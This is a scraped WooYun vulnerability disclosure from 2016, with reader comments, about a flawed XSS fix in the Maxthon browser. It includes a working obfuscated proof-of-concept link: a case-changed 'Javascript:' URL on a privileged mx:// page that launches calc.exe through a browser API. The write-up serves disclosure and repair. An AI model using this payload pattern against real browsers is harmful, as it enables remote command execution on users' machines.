{"id": 86854, "wybug_id": "wooyun-2016-0177012", "wybug_title": "利用傲游浏览器远程命令执行（代码修复不当/导致XSS绕过）", "wybug_corp": "傲游", "wybug_author": "q601333824", "wybug_date": "2016-02-19 14:55", "wybug_open_date": "2016-05-19 15:30", "wybug_type": "远程代码执行", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-02-22：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航、无声信息）\t\t\t\t\t\t\t\t\t2016-04-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-19：\t细节向公众公开  简要描述： 1.才发现认真看代码的话比Fuzz轻松(就算不会英文，知道代码什么意思就行)......2.别加好友问我漏洞从哪里来的，在网吧网管不是白当的，因为除了修电脑泡面，剩下时间很多，也没闲下来,一直在网上学编程..........-------------------------------------------------------------------------------------------------------3.出自《NO GAME NO LIFE游戏人生》---正因为是最弱，所以才理解智慧之强,无限接近于零，却又不等于零的可能性. 详细说明：        1.最新版遨游浏览器 \n\n        2.先看他的漏洞 \nhttp://**.**.**.**/bugs/wooyun-2015-0140915\n      3.官方对XSS的修复如下图 \n\n      4.我直接贴出代码,这个是官方的修复的代码 \nfunction getRealLocation() {\t\tvar loc = location.toString();\t\tvar index = loc.indexOf('?');\t\tloc = (index > -1) ? loc.substr(index + 1) : \"\";\t\tif (loc.substr(0, 11) == 'javascript:') {\t\t\tloc = 'about:blank';\t\t}\t\treturn loc;  }\n       5.从代码可以看出，官方获取URL地址之后，等号进行分割，然后取等号后面的数值，然后在选出前11个字符，刚好是javascript:,如果存在则loc=about:blank     6.这种过滤我小白都看出猫腻了,如果我这个时候,把开通的J字母大写，不就不走这个流程，直接return loc \nJavascript:\n     7.看吧，弹出计算器了 \n\n ---------------------------------------------------------------------------------------------    8.一个条件达成了，弹出计算器，但是还没完，经过测试，要想跳转到这个特权全被限制了，但是如果在同域进行跳转不会拦截    9.所以我在阅读器插入 \n<a href=\"mx://res/error/danger_site.htm?Javascript:eval(String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,105,102,114,97,109,101,34,41,59,115,46,115,114,99,61,34,109,120,58,47,47,114,101,115,47,110,111,116,105,102,105,99,97,116,105,111,110,47,34,59,115,46,111,110,108,111,97,100,61,102,117,110,99,116,105,111,110,40,41,123,115,46,99,111,110,116,101,110,116,87,105,110,100,111,119,46,109,97,120,116,104,111,110,46,112,114,111,103,114,97,109,46,80,114,111,103,114,97,109,46,108,97,117,110,99,104,40,34,67,58,47,119,105,110,100,111,119,115,47,115,121,115,116,101,109,51,50,47,99,97,108,99,46,101,120,101,34,44,34,34,41,125,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59))\" sr_c=\"mx://res/error/danger_site.htm?Javascript:eval(String.fromCharCode(118,97,114,32,115,61,100,111,99,117,109,101,110,116,46,99,114,101,97,116,101,69,108,101,109,101,110,116,40,34,105,102,114,97,109,101,34,41,59,115,46,115,114,99,61,34,109,120,58,47,47,114,101,115,47,110,111,116,105,102,105,99,97,116,105,111,110,47,34,59,115,46,111,110,108,111,97,100,61,102,117,110,99,116,105,111,110,40,41,123,115,46,99,111,110,116,101,110,116,87,105,110,100,111,119,46,109,97,120,116,104,111,110,46,112,114,111,103,114,97,109,46,80,114,111,103,114,97,109,46,108,97,117,110,99,104,40,34,67,58,47,119,105,110,100,111,119,115,47,115,121,115,116,101,109,51,50,47,99,97,108,99,46,101,120,101,34,44,34,34,41,125,59,100,111,99,117,109,101,110,116,46,98,111,100,121,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59))\" target=\"_self\">点我点我点我</a>\n  \n\n  10.有一点要注意，超链接插入要这种形式,要加上target=\"_self\"，因为默认情况下是新窗口打开，这样会拦截，必须加上target=\"_self\"属性，让连接从当前框架打开就不会拦截了................ \n<a href=\"mx://res/error/danger_site.htm?JAVAScript:alert(document.domain)\"  target=\"_self\">\n     漏洞证明：      1.漏洞证明看上面    2.\n\n    3.顺便修正以前别人的误区，就算不是xml后缀也可以解析称XML,在PHP开头加上,只要声明文档类型就行 \nheader(\"Content-Type: application/rss+xml\");\n \n\n   4.这里我用的是thinkphp引入的模版   修复方案：        1.推荐修复用这个代码，转换成小写再进行判断.............. \nstr.toUpperCase()\n      2.至于从自己框架内跳转不拦截，推荐修复方法用所以连接统一用相对地址,我看过html5的标签介绍，可以试试这个标签 \n<base>\n--------------------------------------------------------------------------------      3.别吐槽我为啥只是个网管，我投了简历没人回,因为我写了中专，人家连我会啥也不问了   版权声明：转载请注明来源 q601333824@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2016-02-19 15:21 厂商回复： 会在 4.9 修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-02-19 15:01 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n      \n     2016-02-19 15:02 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1587 漏洞数:237        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  。。。。。。网管不是就会重启电脑吗？    \n     2016-02-19 15:38 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:277 漏洞数:58        | 出自《狐妖小红娘》---自古人妖生死恋，千...)\t\t \n  @小川 重启电脑这种事还没事，就怕有的闲的无聊，故意把电脑整除毛病，整新人    \n     2016-02-19 15:47 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1643 漏洞数:189        | 学无止境)\t\t \n  洞主的浏览器版本是在官网下的么？还是最新的beta版？    \n     2016-02-19 16:05 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:275 漏洞数:60        | 新手上路。)\t\t \n  网管，我的QQ密码是多少？网管，电脑怎么开？@q601333824    \n     2016-02-19 16:06 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:277 漏洞数:58        | 出自《狐妖小红娘》---自古人妖生死恋，千...)\t\t \n  @梧桐雨 就是官方首页下载的    \n     2016-02-19 16:12 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1643 漏洞数:189        | 学无止境)\t\t \n  @q601333824 soga，那确实还有很多没修完的命令执行    \n     2016-02-19 16:15 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:277 漏洞数:58        | 出自《狐妖小红娘》---自古人妖生死恋，千...)\t\t \n  @梧桐雨  其实这个是别人以前的漏洞，去看了修复之后的代码，存在问题    \n     2016-02-19 16:19 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1643 漏洞数:189        | 学无止境)\t\t \n  @q601333824 嗯，新版本遨游架构调整了，你可以去看看。    \n     2016-02-19 16:24 |    \t\tAdra1n \t\t\t( 普通白帽子  |\t\t\t        Rank:441 漏洞数:69        )\t\t \n  @q601333824 我的哪个还是另一个？    \n     2016-02-19 16:48 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:277 漏洞数:58        | 出自《狐妖小红娘》---自古人妖生死恋，千...)\t\t \n  @幻老头儿  上班问网管要耳机听歌，我上哪去弄耳机，我上班带耳机干嘛.电脑关了，电源自己弯下腰插一下都不肯，座位从左边换到右边，让我帮忙换电话线，过两天，座位又从右边换到左边，又要换电话线,这是在耍我    \n     2016-02-19 17:30 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:275 漏洞数:60        | 新手上路。)\t\t \n  @q601333824 哈哈，此人看来是常客。。。    \n     2016-02-19 17:49 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:277 漏洞数:58        | 出自《狐妖小红娘》---自古人妖生死恋，千...)\t\t \n  @幻老头儿 坐我旁边的人说，网管有人叫你，我连名字都不用问知道是谁了    \n     2016-02-20 00:39 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:277 漏洞数:58        | 出自《狐妖小红娘》---自古人妖生死恋，千...)\t\t \n  @Adra1n 不是，是去年的漏洞，XSS修的太搞笑了    \n     2016-02-26 10:36 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:277 漏洞数:58        | 出自《狐妖小红娘》---自古人妖生死恋，千...)\t\t \n  这个XSS修的太搞笑的原因就是，虽然过滤规则写的很可怕，但是仔细一看其实没过滤一样.................    \n     2016-02-26 11:04 |    \t\tq601333824 \t\t\t( 普通白帽子  |\t\t\t        Rank:277 漏洞数:58        | 出自《狐妖小红娘》---自古人妖生死恋，千...)\t\t \n  --------------------------------------------------------------（分割线,别捣乱）投了简历，如果面试问这个，上面就是回答    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}